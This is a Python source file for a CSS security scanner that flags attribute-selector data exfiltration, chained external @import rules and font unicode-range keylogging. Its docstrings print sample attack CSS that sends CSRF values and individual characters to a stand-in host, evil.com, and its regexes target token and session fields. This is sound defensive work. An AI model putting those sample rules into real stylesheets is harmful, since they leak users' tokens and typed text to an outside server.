"""
CSS Security Scanner
Tests: attribute selector exfiltration, @import chaining, font ligature keylogging
"""

import re
from dataclasses import dataclass
from typing import List

@dataclass
class Finding:
    test_name: str
    severity: str
    file_path: str
    line_number: int
    line_content: str
    description: str


class CSSScanner:
    """Runs all CSS security tests on a single file."""

    EXTENSIONS = {".css"}

    def scan(self, file_path: str) -> List[Finding]:
        """Run all CSS tests on one file."""
        try:
            with open(file_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
        except Exception as e:
            return []

        lines = content.split("\n")
        findings = []

        findings.extend(self._test_attribute_selector_exfil(file_path, lines, content))
        findings.extend(self._test_import_chain(file_path, lines, content))
        findings.extend(self._test_font_ligature_keylog(file_path, lines, content))

        return findings

    # ------------------------------------------------------------------ #
    # TEST 12: CSS Attribute Selector Data Exfiltration
    # ------------------------------------------------------------------ #
    def _test_attribute_selector_exfil(self, fp: str, lines: list, content: str) -> List[Finding]:
        """
        Detect CSS attribute selectors targeting sensitive attributes combined
        with url() that could exfiltrate data to an external server.

        Attack pattern:
            input[name=csrf][value^=a] { background-image: url(https://evil.com/?a); }
        """
        findings = []

        # Sensitive attribute selectors
        attr_selector_patterns = [
            # value attribute probing (prefix, suffix, substring, exact)
            r'\[\s*value\s*[\^$*|~]?=',
            # name attribute combined with value
            r'\[\s*name\s*=\s*[\'"]?\w+[\'"]?\s*\]\s*\[\s*value',
            # Token/CSRF specific
            r'\[\s*(?:name|id)\s*=\s*[\'"]?(?:csrf|token|_token|auth|session|secret)',
            # href attribute probing (for anchor links)
            r'\[\s*href\s*[\^$*]?=',
            # type=hidden combined with value probing
            r'\[\s*type\s*=\s*[\'"]?hidden[\'"]?\s*\]\s*\[\s*value',
        ]

        # URL exfiltration sinks in CSS
        url_patterns = [
            r'background(?:-image)?\s*:\s*url\s*\(\s*[\'"]?https?://',
            r'list-style(?:-image)?\s*:\s*url\s*\(\s*[\'"]?https?://',
            r'content\s*:\s*url\s*\(\s*[\'"]?https?://',
            r'cursor\s*:\s*url\s*\(\s*[\'"]?https?://',
        ]

        for i, line in enumerate(lines, 1):
            for attr_pat in attr_selector_patterns:
                if re.search(attr_pat, line, re.IGNORECASE):
                    # Check if same rule block has a URL (within ±3 lines)
                    context = "\n".join(lines[max(0, i-4):min(len(lines), i+3)])
                    for url_pat in url_patterns:
                        if re.search(url_pat, context, re.IGNORECASE):
                            findings.append(Finding(
                                "css_attr_exfil", "CRITICAL", fp, i,
                                line.strip()[:200],
                                "CSS attribute selector combined with external URL — "
                                "potential data exfiltration via CSS"
                            ))
                            break
                    else:
                        # Attribute selector without URL is still suspicious
                        if re.search(r'value\s*[\^$*]=', line, re.IGNORECASE):
                            findings.append(Finding(
                                "css_attr_exfil", "MEDIUM", fp, i,
                                line.strip()[:200],
                                "CSS attribute selector probing value prefixes/suffixes "
                                "(suspicious if user-injectable)"
                            ))

        # Bulk detection: many attribute selectors for same attribute = systematic exfil
        value_probe_count = len(re.findall(
            r'\[value\^=', content, re.IGNORECASE
        ))
        if value_probe_count >= 5:
            findings.append(Finding(
                "css_attr_exfil", "CRITICAL", fp, 0, "",
                f"Found {value_probe_count} value prefix selectors [value^=] — "
                f"likely systematic CSS data exfiltration attempt"
            ))

        return findings

    # ------------------------------------------------------------------ #
    # TEST 13: @import Chain Exfiltration
    # ------------------------------------------------------------------ #
    def _test_import_chain(self, fp: str, lines: list, content: str) -> List[Finding]:
        """
        Detect @import rules pointing to external domains, especially
        chained imports that enable single-injection-point exfiltration.

        Attack pattern:
            @import 'https://evil.com/start';
            /* Server responds with more @imports that block until data is leaked */
        """
        findings = []

        # Find all @import rules
        import_pattern = re.compile(
            r'@import\s+(?:url\s*\()?\s*[\'"]?(https?://[^\s\'"\)]+)',
            re.IGNORECASE
        )

        external_imports = []
        for i, line in enumerate(lines, 1):
            for match in import_pattern.finditer(line):
                url = match.group(1)
                external_imports.append((i, line.strip()[:200], url))
                findings.append(Finding(
                    "css_import_chain", "MEDIUM", fp, i,
                    line.strip()[:200],
                    f"External CSS @import: {url}"
                ))

        # Multiple external imports = higher risk (chaining pattern)
        if len(external_imports) >= 3:
            # Check if they go to the same domain
            domains = set()
            for _, _, url in external_imports:
                domain_match = re.search(r'https?://([^/]+)', url)
                if domain_match:
                    domains.add(domain_match.group(1))

            if len(domains) == 1:
                findings.append(Finding(
                    "css_import_chain", "HIGH", fp, 0, "",
                    f"Found {len(external_imports)} @import rules to SAME external domain "
                    f"({domains.pop()}) — pattern consistent with CSS exfiltration chain"
                ))
            elif len(external_imports) >= 5:
                findings.append(Finding(
                    "css_import_chain", "HIGH", fp, 0, "",
                    f"Found {len(external_imports)} external @import rules — "
                    f"unusually high, review for exfiltration"
                ))

        return findings

    # ------------------------------------------------------------------ #
    # TEST 14: Font Ligature Keylogging
    # ------------------------------------------------------------------ #
    def _test_font_ligature_keylog(self, fp: str, lines: list, content: str) -> List[Finding]:
        """
        Detect @font-face declarations with narrow unicode-range and external
        src URLs that could leak rendered text character by character.

        Attack pattern:
            @font-face {
                font-family: "leak";
                src: url(https://evil.com/log?char=A);
                unicode-range: U+0041;
            }
        """
        findings = []

        # Find @font-face blocks
        fontface_blocks = re.finditer(
            r'@font-face\s*\{([^}]+)\}',
            content,
            re.IGNORECASE | re.DOTALL
        )

        unicode_range_faces = []
        for block_match in fontface_blocks:
            block = block_match.group(1)
            block_start = content[:block_match.start()].count("\n") + 1

            has_unicode_range = re.search(r'unicode-range\s*:', block, re.IGNORECASE)
            has_external_src = re.search(r'src\s*:\s*url\s*\(\s*[\'"]?https?://', block, re.IGNORECASE)

            if has_unicode_range and has_external_src:
                # Check how narrow the unicode range is
                ranges = re.findall(r'U\+[0-9A-Fa-f]{4}(?:\s*-\s*U\+[0-9A-Fa-f]{4})?',
                                    block)
                is_single_char = any(
                    not ('-' in r) for r in ranges  # Single codepoint, not a range
                )

                src_url = re.search(r'src\s*:\s*url\s*\(\s*[\'"]?(https?://[^\s\'"\)]+)', block)
                url = src_url.group(1) if src_url else "unknown"

                if is_single_char:
                    unicode_range_faces.append(block_start)
                    findings.append(Finding(
                        "css_font_keylog", "HIGH", fp, block_start,
                        block.strip()[:200],
                        f"@font-face with SINGLE character unicode-range and external URL "
                        f"({url}) — potential character-level exfiltration"
                    ))


        # Bulk detection: many @font-face with single unicode-range = keylogging
        if len(unicode_range_faces) >= 5:
            findings.append(Finding(
                "css_font_keylog", "CRITICAL", fp, 0, "",
                f"Found {len(unicode_range_faces)} @font-face blocks with single-character "
                f"unicode-range and external URLs — strong indicator of CSS keylogging"
            ))

        return findings
